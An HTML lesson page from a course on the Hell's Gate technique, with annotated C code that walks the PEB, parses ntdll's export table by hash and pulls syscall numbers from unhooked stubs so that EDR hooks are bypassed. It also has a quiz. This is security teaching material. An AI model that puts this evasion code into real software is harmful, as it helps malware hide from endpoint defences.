@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: The Hell's Gate Algorithm - HellsGate Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F525;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#e11d48;--accent2:#be123c;--gradient:linear-gradient(135deg,#e11d48,#be123c)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>HellsGate Course</h2>
+<span>Dynamic SSN &amp; Direct Syscalls</span>
+</div>
+<a class="home-link" href="../HellsGate_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">1</span> EDR Hooking</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">2</span> Syscall Architecture</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">3</span> SSN Basics</a>
+<a class="mod-link" href="module4.html"><span class="diff d2">4</span> ntdll Stub Anatomy</a>
+<a class="mod-link active" href="module5.html"><span class="diff d2">5</span> Hell's Gate Algorithm</a>
+<a class="mod-link" href="module6.html"><span class="diff d2">6</span> Direct Syscall Exec</a>
+<a class="mod-link" href="module7.html"><span class="diff d3">7</span> Halo's &amp; Tartarus Gate</a>
+<a class="mod-link" href="module8.html"><span class="diff d3">8</span> Full Chain &amp; Detection</a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 5: The Hell's Gate Algorithm</h1>
+<p class="subtitle">Walk the gates, read the stubs, resolve the numbers.</p>
+
+<div class="card highlight">
+<h4>The Core of Hell's Gate</h4>
+<p>This is the heart of the technique. The Hell's Gate algorithm walks the ntdll.dll Export Address Table, locates target Nt* functions by hash, reads the syscall stub bytes to extract the SSN, and populates a table of resolved syscall entries. This module walks through the complete algorithm step by step, using the actual code patterns from the original Hell's Gate implementation.</p>
+</div>
+
+<h2>Algorithm Overview</h2>
+<p>The Hell's Gate resolution process has four phases:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Hell's Gate Resolution Flow</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:600px;margin:0 auto">
+<div class="box" style="width:100%">Phase 1: Find ntdll.dll base via PEB walking</div>
+<div class="box" style="width:100%">Phase 2: Parse EAT to get function addresses by hash</div>
+<div class="box hl" style="width:100%">Phase 3: Validate stub bytes and extract SSN</div>
+<div class="box g" style="width:100%">Phase 4: Store SSN in VX_TABLE_ENTRY for later syscall execution</div>
+</div>
+</div>
+
+<h2>Phase 1: Locating ntdll.dll</h2>
+<p>The first step is finding the base address of ntdll.dll without calling any API (since the APIs we need might be hooked). Hell's Gate uses PEB walking:</p>
+
+<pre><code><span class="lang-tag">C</span>// From HellsGate main.c
+PTEB pCurrentTeb = RtlGetCurrentTeb();
+PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
+
+// Walk InMemoryOrderModuleList
+PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)(
+    (PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink
+    - 0x10  // subtract offset of InMemoryOrderLinks within LDR_DATA_TABLE_ENTRY
+);
+
+// pLdrDataEntry->DllBase is now the base address of ntdll.dll
+PVOID pNtdllBase = pLdrDataEntry->DllBase;</code></pre>
+
+<h2>Phase 2: Parsing the Export Address Table</h2>
+<p>With the ntdll base address, Hell's Gate parses the PE headers to reach the Export Directory, then iterates through exported function names:</p>
+
+<pre><code><span class="lang-tag">C</span>// Parse PE headers to reach the Export Directory
+PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdllBase;
+PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDos->e_lfanew);
+
+PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
+    (PBYTE)pNtdllBase +
+    pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+);
+
+// The three parallel arrays in the Export Directory:
+PDWORD pdwAddrOfFunctions    = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfFunctions);
+PDWORD pdwAddrOfNames        = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNames);
+PWORD  pwAddrOfNameOrdinals  = (PWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNameOrdinals);
+
+// Walk all named exports
+for (DWORD i = 0; i &lt; pExportDir->NumberOfNames; i++) {
+    // Get the function name
+    PCHAR pFuncName = (PCHAR)((PBYTE)pNtdllBase + pdwAddrOfNames[i]);
+
+    // Compute DJB2 hash
+    DWORD64 dwFuncHash = djb2((PBYTE)pFuncName);
+
+    // Compare against our target hashes
+    // If match found: resolve address using ordinal table
+    PVOID pFuncAddr = (PVOID)((PBYTE)pNtdllBase +
+                      pdwAddrOfFunctions[pwAddrOfNameOrdinals[i]]);
+    // ... populate VX_TABLE_ENTRY
+}</code></pre>
+
+<div class="card">
+<h4>Understanding the Three Parallel Arrays</h4>
+<p>The Export Directory contains three related arrays. <code>AddressOfNames</code> holds RVAs to function name strings. <code>AddressOfNameOrdinals</code> holds the ordinal index for each name. <code>AddressOfFunctions</code> holds the function RVAs indexed by ordinal. To resolve a name to an address: find the name in <code>AddressOfNames</code> (index <code>i</code>), read the ordinal from <code>AddressOfNameOrdinals[i]</code>, then read the function RVA from <code>AddressOfFunctions[ordinal]</code>.</p>
+</div>
+
+<h2>Phase 3: The GetVxTableEntry Function</h2>
+<p>This is the critical function that validates a stub and extracts the SSN. Here is the logic from the original Hell's Gate code, annotated:</p>
+
+<pre><code><span class="lang-tag">C</span>// Hell's Gate - GetVxTableEntry
+// Returns TRUE if the stub is clean and SSN was extracted
+BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pExportDir,
+                     PVX_TABLE_ENTRY pVxTableEntry) {
+
+    PDWORD pdwAddrOfFunctions    = /* ... resolved from pExportDir ... */;
+    PDWORD pdwAddrOfNames        = /* ... */;
+    PWORD  pwAddrOfNameOrdinals  = /* ... */;
+
+    for (DWORD i = 0; i &lt; pExportDir->NumberOfNames; i++) {
+        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddrOfNames[i]);
+
+        // Compare hash of exported name against target hash
+        if (djb2((PBYTE)pczFunctionName) == pVxTableEntry->dwHash) {
+
+            // Found the target function - get its address
+            PVOID pFunctionAddress = (PVOID)((PBYTE)pModuleBase +
+                pdwAddrOfFunctions[pwAddrOfNameOrdinals[i]]);
+            pVxTableEntry->pAddress = pFunctionAddress;
+
+            // --- STUB VALIDATION ---
+            // Check if the stub is clean (not hooked)
+            // Expected: 4c 8b d1 b8 XX XX 00 00
+
+            BYTE* stub = (BYTE*)pFunctionAddress;
+
+            // Check for: mov r10, rcx (4c 8b d1)
+            //            mov eax, SSN (b8 XX XX 00 00)
+            if (stub[0] == 0x4c
+             && stub[1] == 0x8b
+             && stub[2] == 0xd1
+             && stub[3] == 0xb8
+             && stub[6] == 0x00    // High bytes of SSN must be zero
+             && stub[7] == 0x00) { // (SSNs are always < 0x200, so upper bytes are 0)
+
+                // Clean stub! Extract SSN from bytes 4-5
+                BYTE high = stub[5];
+                BYTE low  = stub[4];
+                pVxTableEntry->wSystemCall = (high << 8) | low;
+                return TRUE;  // SSN successfully resolved
+            }
+
+            // If we get here, the stub is hooked (first bytes modified)
+            return FALSE;
+        }
+    }
+    return FALSE;  // Function not found in exports
+}</code></pre>
+
+<div class="card warn">
+<h4>Original Hell's Gate Limitation</h4>
+<p>The original Hell's Gate implementation returns FALSE if the stub is hooked. It does <strong>not</strong> attempt to recover the SSN from a hooked stub. This means if an EDR hooks the specific function you need, Hell's Gate fails. This limitation is what motivated the development of <strong>Halo's Gate</strong> and <strong>TartarusGate</strong> (Module 7), which add neighbor-based SSN recovery.</p>
+</div>
+
+<h2>Phase 4: Populating the VX_TABLE</h2>
+<p>The main function calls <code>GetVxTableEntry</code> for each target syscall and assembles the complete table:</p>
+
+<pre><code><span class="lang-tag">C</span>// From main.c - populating the syscall table
+VX_TABLE Table = { 0 };
+
+// Set the target hashes (pre-computed DJB2 values)
+Table.NtAllocateVirtualMemory.dwHash = 0xF5BD373480A6B89B;
+Table.NtProtectVirtualMemory.dwHash  = 0x858BCB1046FB6A37;
+Table.NtCreateThreadEx.dwHash        = 0x64DC7DB288C5015F;
+Table.NtWaitForSingleObject.dwHash   = 0xC6A2FA174E551BCB;
+
+// Resolve each entry
+if (!GetVxTableEntry(pNtdllBase, pExportDir, &Table.NtAllocateVirtualMemory)) {
+    // Handle error: stub is hooked or function not found
+    return -1;
+}
+if (!GetVxTableEntry(pNtdllBase, pExportDir, &Table.NtProtectVirtualMemory)) {
+    return -1;
+}
+if (!GetVxTableEntry(pNtdllBase, pExportDir, &Table.NtCreateThreadEx)) {
+    return -1;
+}
+if (!GetVxTableEntry(pNtdllBase, pExportDir, &Table.NtWaitForSingleObject)) {
+    return -1;
+}
+
+// At this point, Table contains:
+// - pAddress:     pointer to each Nt* function in ntdll
+// - wSystemCall:  the SSN for each function
+// - dwHash:       the hash (already set)
+// Ready for direct syscall execution (Module 6)</code></pre>
+
+<h2>Complete Algorithm Diagram</h2>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Hell's Gate Full Resolution Flow</h4>
+<div class="flow">
+<div class="box">PEB Walk<br>Find ntdll base</div>
+<div class="arrow">&rarr;</div>
+<div class="box">Parse EAT<br>Walk exports</div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">Hash Match<br>DJB2 compare</div>
+<div class="arrow">&rarr;</div>
+<div class="box y">Validate Stub<br>4c 8b d1 b8?</div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Extract SSN<br>bytes [4:5]</div>
+</div>
+</div>
+
+<div class="card green">
+<h4>Why This Is Powerful</h4>
+<p>The entire resolution happens in user-mode memory with no API calls, no file I/O, and no suspicious behavior. Hell's Gate simply reads data structures (PEB, PE headers, EAT) that are already mapped into the process. The only "output" is a small table of integers (the SSNs). No ntdll code is modified, no DLLs are loaded, and no functions are called. From the EDR's perspective, the process is just reading its own memory.</p>
+</div>
+
+<div class="quiz" id="quiz5">
+<h4>Pop Quiz: The Hell's Gate Algorithm</h4>
+<div class="quiz-q" data-correct="0">
+<p>Q1: What byte pattern does Hell's Gate check to confirm a clean (unhooked) syscall stub?</p>
+<label data-opt="0"><input type="radio" name="q5_0"> <code>4c 8b d1 b8</code> (mov r10,rcx + mov eax,imm32)</label>
+<label data-opt="1"><input type="radio" name="q5_0"> <code>0f 05 c3</code> (syscall + ret)</label>
+<label data-opt="2"><input type="radio" name="q5_0"> <code>e9 xx xx xx xx</code> (jmp rel32)</label>
+<label data-opt="3"><input type="radio" name="q5_0"> <code>cc cc cc cc</code> (int3 padding)</label>
+<div class="explain">Hell's Gate validates bytes 0-3 as 0x4c, 0x8b, 0xd1, 0xb8. This is the start of a clean stub: mov r10, rcx followed by mov eax. If these bytes are different (e.g., an E9 JMP from an EDR hook), the stub is marked as hooked.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q2: What happens in the original Hell's Gate implementation if the target stub IS hooked?</p>
+<label data-opt="0"><input type="radio" name="q5_1"> It searches neighboring stubs to calculate the SSN</label>
+<label data-opt="1"><input type="radio" name="q5_1"> It unhooks the stub by writing the original bytes</label>
+<label data-opt="2"><input type="radio" name="q5_1"> It returns FALSE -- resolution fails</label>
+<label data-opt="3"><input type="radio" name="q5_1"> It reads a clean copy of ntdll from disk</label>
+<div class="explain">The original Hell's Gate returns FALSE if the stub pattern does not match. It does not attempt recovery. Neighbor-based recovery was added later by Halo's Gate and TartarusGate.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q3: In the EAT resolution process, what is the purpose of the AddressOfNameOrdinals array?</p>
+<label data-opt="0"><input type="radio" name="q5_2"> It stores the SSN for each function</label>
+<label data-opt="1"><input type="radio" name="q5_2"> It maps name index to function ordinal, which indexes into AddressOfFunctions</label>
+<label data-opt="2"><input type="radio" name="q5_2"> It contains the DJB2 hash of each function</label>
+<label data-opt="3"><input type="radio" name="q5_2"> It stores the size of each function</label>
+<div class="explain">AddressOfNames and AddressOfFunctions use different indexing. AddressOfNameOrdinals bridges them: the ordinal at index i in AddressOfNameOrdinals corresponds to the name at index i in AddressOfNames, and that ordinal is used to index into AddressOfFunctions to get the function RVA.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz5')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module4.html">&larr; Previous: Stub Anatomy</a>
+<a class="primary" href="module6.html">Next: Direct Syscall Execution &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
